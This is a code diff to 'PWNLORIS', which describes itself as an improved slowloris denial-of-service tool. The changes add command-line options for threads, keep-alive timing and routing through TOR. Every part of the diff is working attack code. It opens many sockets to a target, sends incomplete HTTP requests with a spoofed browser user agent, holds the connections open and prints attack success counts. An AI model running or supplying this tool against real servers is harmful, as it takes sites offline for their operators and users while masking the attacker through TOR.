@@ -6,48 +6,43 @@ import socket
 import time
 import signal
 import threading
+import argparse
 
-MAX_THREAD    = 8
-TIMEOUT_INTVL = 5
-TIMEOUT_TCP   = 10
-TIMEOUT_REQ   = 90
-
-class termcolor:
-    OK = '\033[92m'
-    WARNING = '\033[93m'
-    FAIL = '\033[91m'
-    BOLD = '\033[1m'
-    UNDERLINE = '\033[4m'
-    NONE = '\033[0m'
+parser = argparse.ArgumentParser(description='\033[94mPWNLORIS. An improved slowloris DOS tool by houssniyh\033[0m')
+parser.add_argument('host', metavar='Host', nargs=None, help='host to be tested')
+parser.add_argument('-t', '--tor', help='enable to attack through TOR', action="store_true")
+parser.add_argument('-n', dest='threads', type=int, default=8, nargs='?', help='number of threads (default 8)', action="store")
+parser.add_argument('-k', dest='keepalive', type=int, default=90, nargs='?', help='seconds to keep connection alive (default 90)', action="store")
+parser.add_argument('-i', dest='interval', type=int, default=5, nargs='?', help='seconds between keep alive check intervals (default 5)', action="store")
+args = parser.parse_args()
 
 def slowloris():
-    url = sys.argv[1]
+    url = args.host
     hostport = url.split(':')
     host = hostport[0]
     port = int(hostport[1]) if len(hostport) == 2 else 80
-    is_tor = len(sys.argv) > 2 and sys.argv[2] in [ '-t', '--tor' ]
     
     print_target(host, port)
     print_status()
-    start_attack_thread(host, port, is_tor)
+    start_attack_thread(host, port)
 
     try:
         interruptable_event().wait()
     except KeyboardInterrupt:
         sys.exit(0)
 
-def start_attack_thread(host, port, is_tor):
+def start_attack_thread(host, port):
     i = 0
-    while i < MAX_THREAD:
+    while i < args.threads:
         try:
-            thread = threading.Thread(target=setup_attack, args=[host, port, is_tor])
+            thread = threading.Thread(target=setup_attack, args=[host, port])
             thread.daemon = True
             thread.start()
             i += 1
         except:
             pass
 
-def setup_attack(host, port, is_tor):
+def setup_attack(host, port):
     while True:
         sockets = []
         tries_failed = 0
@@ -55,7 +50,7 @@ def setup_attack(host, port, is_tor):
         while True:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-            if is_tor:
+            if args.tor:
                 socks.set_default_proxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1', 9050)
                 socket.socket = socks.socksocket
 
@@ -64,37 +59,37 @@ def setup_attack(host, port, is_tor):
 
             if sys.platform == 'linux' or sys.platform == 'linux2':
                 sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, 1)
-                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, TIMEOUT_INTVL)
+                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, args.interval)
             elif sys.platform == 'darwin':
-                sock.setsockopt(socket.IPPROTO_TCP, 0x10, TIMEOUT_INTVL)
+                sock.setsockopt(socket.IPPROTO_TCP, 0x10, args.interval)
             elif sys.platform == 'win32':
-                sock.ioctl(socket.SIO_KEEPALIVE_VALS, (1, TIMEOUT_REQ * 1000, TIMEOUT_INTVL * 1000))
+                sock.ioctl(socket.SIO_KEEPALIVE_VALS, (1, args.keepalive * 1000, args.interval * 1000))
             
-            sock.settimeout(TIMEOUT_TCP)
+            sock.settimeout(5)
             sockets.append(sock)
 
-            if not send_payload(sock, host, port, is_tor):
+            if not send_payload(sock, host, port):
                 tries_failed += 1
 
             if tries_failed > 5:
                 break
 
-        time.sleep(TIMEOUT_REQ)
+        time.sleep(args.keepalive)
         disconnect_sockets(sockets)
 
-def send_payload(sock, host, port, is_tor):
-    random = int(time.time() * 1_000) % 10_000
+def send_payload(sock, host, port):
+    random = int(time.time() * 1000) % 10000
     method = 'POST' if random % 2 == 0 else 'GET'
     payload = ('%s /?%i HTTP/1.1\r\n'
         'Host: %s\r\n'
         'User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_6 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1\r\n'
         'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\r\n'
         'Connection: Keep-Alive\r\n'
-        'Keep-Alive: timeout=120\r\n'
-        'Content-Length: 42\r\n') % (method, random, host)
+        'Keep-Alive: timeout=%i\r\n'
+        'Content-Length: 42\r\n') % (method, random, host, args.keepalive)
 
     try:
-        is_tor and sock.get_proxy_sockname()
+        args.tor and sock.get_proxy_sockname()
         sock.connect((host, port))
         sock.sendall(payload.encode('utf-8'))
     except (AttributeError, socks.ProxyConnectionError):
@@ -113,16 +108,16 @@ send_payload.amount_success = 0
 send_payload.amount_failed  = 0
 
 def print_target(host, port):
-    str_target = 'Attacking %s%s:%i%s' % (termcolor.BOLD, host, port, termcolor.NONE)
+    str_target = 'Attacking \033[1m%s:%i\033[0m' % (host, port)
     print(str_target)
 
 def print_status(str_extra=None):
-    str_success = termcolor.OK + '  Payloads successful: %i' % send_payload.amount_success
-    str_and = termcolor.NONE + ', '
-    str_failed = termcolor.FAIL + 'payloads failed: %i' % send_payload.amount_failed
-    str_extra = termcolor.NONE + (', ' + str_extra if str_extra else '')
+    str_success = '\033[92mPayloads successful: %i' % send_payload.amount_success
+    str_and = '\033[90m, '
+    str_failed = '\033[91mpayloads failed: %i' % send_payload.amount_failed
+    str_extra = ('\033[0m, ' + str_extra if str_extra else '')
     
-    print(str_success + str_and + str_failed + str_extra + termcolor.NONE, end='\r')
+    print(str_success + str_and + str_failed + str_extra + '\033[0m', end='\r')
     sys.stdout.write("\033[K")
 
 def disconnect_sockets(sockets):
@@ -150,13 +145,6 @@ def signal_handler(signal, frame):
     sys.exit(0)
 
 if __name__ == '__main__':
-    if len(sys.argv) < 2 or not sys.argv[1]:
-        print('No IP or domain name of the victim given')
-        print('Usage: ~$ ./pwnloris.py host:port {-t/--tor}')
-        sys.exit(1)
-
     signal.signal(signal.SIGHUP, signal_handler)
     signal.signal(signal.SIGINT, signal_handler)
-    
     slowloris()
-
